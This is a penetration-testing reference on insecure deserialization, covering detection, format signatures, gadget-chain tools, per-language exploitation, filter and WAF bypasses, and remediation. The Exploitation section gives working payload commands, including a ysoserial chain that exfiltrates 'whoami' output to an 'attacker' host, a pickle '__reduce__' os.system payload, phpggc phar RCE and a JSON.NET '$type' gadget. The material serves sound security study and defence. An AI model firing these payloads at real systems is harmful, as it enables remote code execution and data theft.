# Insecure Deserialization

> Deserializer accepts attacker-controlled bytes and reconstructs object graphs with side effects (magic methods, constructors, type-coerced gadgets). Authorized testing only. Map: OWASP Top 10 A08:2021 (Software & Data Integrity Failures), CWE-502.

## TL;DR
- "Gadget chains" — chains of standard-library and framework classes whose constructors / `readObject` / `__wakeup` / `__destruct` / `__toString` side effects (file I/O, reflection, command exec) execute by virtue of the object being instantiated.
- Per-runtime:
  - **Java**: `ObjectInputStream.readObject` — ysoserial generates gadget chains.
  - **Python**: `pickle.loads` — `__reduce__` returns `(eval, ('cmd',))` style payload.
  - **PHP**: `unserialize()` — `__wakeup`/`__destruct` chains, Phar (`phar://`) wrapper file-read deserialization.
  - **.NET**: `BinaryFormatter` (deprecated), `JSON.NET TypeNameHandling=Auto/All`, `XmlSerializer` with type-hint XML.
  - **Ruby**: `Marshal.load`, `YAML.load` (Psych) — gadgets in Rails / ActiveSupport.
- Defence: don't deserialize untrusted data. Use safe formats (JSON without type tags, Protocol Buffers, MessagePack with schema). If you must, integrity-sign + version + restrict allowed types.

## Detection / Discovery

### Find the deserializer
- Java: `ObjectInputStream`, RMI ports (1099, dynamic), JMX, JBoss/WebLogic/WebSphere admin consoles, Apache Commons-Collections in classpath.
- Python: `pickle.loads` / `pickle.load`, `yaml.load(input)` without `Loader=SafeLoader` / `yaml.unsafe_load`, `dill`, `joblib`, ML model loading (`torch.load` defaults to pickle).
- PHP: `unserialize()` taking GET/POST/cookie, `file_get_contents("phar://...")`, deserializing session data, `__wakeup` magic methods.
- .NET: `BinaryFormatter`, `LosFormatter`, `NetDataContractSerializer`, `JsonConvert.DeserializeObject<T>` with `TypeNameHandling != None`, `XmlSerializer` with `[XmlInclude]`.
- Ruby: `Marshal.load`, `YAML.load`, `YAML.unsafe_load`, `Oj.load` default mode.

### Recognise the format
- Java: `0xAC 0xED 0x00 0x05` magic bytes (`AC ED 00 05`) at start. Base64 starts with `rO0`.
- Python pickle: starts with opcode bytes; `\x80\x04` for proto 4. Base64 often starts with `gA`.
- PHP: serialised string like `a:1:{i:0;s:5:"Hello";}` or `O:8:"ClassName":1:{s:4:"prop";s:5:"value";}`.
- .NET BinaryFormatter: starts with `0x00 0x01 0x00 0x00 0x00 0xFF 0xFF 0xFF 0xFF`.
- Ruby Marshal: starts with `\x04\x08`.

### YSoSerial.NET / ysoserial
| Tool | Language |
| --- | --- |
| https://github.com/frohoff/ysoserial | Java |
| https://github.com/pwntester/ysoserial.net | .NET |
| https://github.com/ambionics/phpggc | PHP |
| https://github.com/ConstellationPwn/Yet-Another-Pickle-Exploit | Python (illustrative; pickle is simple enough to hand-craft) |

## Exploitation

### Java — ysoserial
```bash
java -jar ysoserial.jar CommonsCollections6 'curl http://attacker/$(whoami | base64)' > payload.bin
# Send payload.bin to the endpoint that deserializes — e.g. JBoss/JMX/RMI
curl --data-binary @payload.bin http://target:8080/invoker/JMXInvokerServlet \
     -H 'Content-Type: application/x-java-serialized-object'
```
Common chains: `CommonsCollections1-7`, `Spring1`, `JRMPClient` (callback-based, useful when target makes outbound).

### Python pickle — `__reduce__` payload
```python
import pickle, os, base64
class Pwn:
    def __reduce__(self):
        return (os.system, ('id > /tmp/pwn',))
print(base64.b64encode(pickle.dumps(Pwn())).decode())
```
Send the resulting base64 to anywhere the app `pickle.loads` it (cookie, cached object, ML model file, Celery task).

### PHP — phar wrapper deserialization (works without `unserialize()` call)
Any PHP file operation on a `phar://` URL (`file_exists`, `fopen`, `file_get_contents`, `getimagesize`) deserialises the phar's metadata. Build a phar with attacker-controlled metadata that triggers `__destruct` / `__wakeup` on a vulnerable class:
```bash
phpggc --phar phar Symfony/RCE5 system 'id' -o evil.phar
# Upload as 'evil.phar' (or rename to a passing extension), then trigger any file-op on phar://path/evil.phar
```

### .NET BinaryFormatter / JSON.NET TypeNameHandling
```bash
ysoserial.net.exe -g TypeConfuseDelegate -f BinaryFormatter -c 'cmd /c calc' -o base64
# Send the base64 to the deserializer endpoint
```
JSON.NET with `TypeNameHandling = TypeNameHandling.All` accepts a `$type` field in JSON specifying which class to instantiate. Attacker supplies a gadget class:
```json
{"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework, ...", "MethodName":"Start", ...}
```

### Ruby YAML — Psych gadget chains
```ruby
require 'erb'
require 'yaml'
template = "<%= `id` %>"
payload = "--- !ruby/object:ERB\ntemplate: <%= `id` %>\n..."
YAML.unsafe_load(payload)   # → executes `id`
```

## Bypasses
- Length-limit on the input field — pickle / Java gadgets can be small (CommonsCollections1 under 1 KB; pickle `__reduce__` under 100 bytes).
- "Filter on dangerous class names" → use a less-obvious gadget. ysoserial maintains many chains; defender's blocklist will lag.
- WAF inspects body but not multipart parts, cookies, or websocket frames.

## Defence / Remediation
- **Don't deserialize untrusted data**. Use schema-validated JSON (Ajv/Zod for JS, Pydantic for Python, Jackson with `objectMapper.deactivateDefaultTyping()` for Java) — explicit field-by-field mapping, no polymorphic type tags.
- **Java**: switch to JSON. If you must use Java serialisation, set up `ObjectInputFilter` (JEP 290, Java 9+) with a positive-model allow-list of class names. Audit dependencies for `commons-collections`, `commons-beanutils`, `Spring beans` — known gadget sources.
- **Python**: never `pickle.loads(untrusted)`. For YAML use `yaml.safe_load`. For ML model loading prefer `safetensors`. For Celery use the JSON serializer.
- **PHP**: avoid `unserialize` on user input. PHP 8.0+ has improved Phar restrictions but still risky. Use `json_decode`. If `unserialize` is unavoidable, the `allowed_classes` option (PHP 7+) provides a positive-model filter.
- **.NET**: BinaryFormatter is deprecated (removed in .NET 9). Use `System.Text.Json` with `JsonSerializerOptions` minus any type-hint settings. JSON.NET: `TypeNameHandling.None` always.
- **Ruby**: `YAML.safe_load` (not `unsafe_load`). `Marshal.load` only on internal trusted data.
- **Integrity-sign** any serialised blob the application stores (cookies, hidden fields, files). HMAC + verify on read. Even safe formats benefit from this.
- **WAF as defence in depth** — block known magic bytes (`rO0`, `aced`, `\x80\x04`, `O:`) in untrusted fields, but treat as detection-only.
- **CI**: `gadgetinspector` (Java) and similar static analyzers to surface deserialization sinks.

## Sources
- OWASP Cheat Sheet — Deserialization: https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html
- OWASP Top 10 A08:2021 Software & Data Integrity Failures: https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/
- ysoserial (Java): https://github.com/frohoff/ysoserial
- ysoserial.net: https://github.com/pwntester/ysoserial.net
- phpggc (PHP): https://github.com/ambionics/phpggc
- Sam Thomas — Phar deserialization (BlackHat USA 2018): https://i.blackhat.com/us-18/Thu-August-9/us-18-Thomas-Its-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It.pdf
- PortSwigger — Insecure deserialization: https://portswigger.net/web-security/deserialization
- PayloadsAllTheThings — Insecure Deserialization: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Insecure%20Deserialization
- HackTricks deserialization: https://book.hacktricks.wiki/en/pentesting-web/deserialization/index.html
- CWE-502 Deserialization of Untrusted Data: https://cwe.mitre.org/data/definitions/502.html
- JEP 290 — Filter Incoming Serialization Data: https://openjdk.org/jeps/290
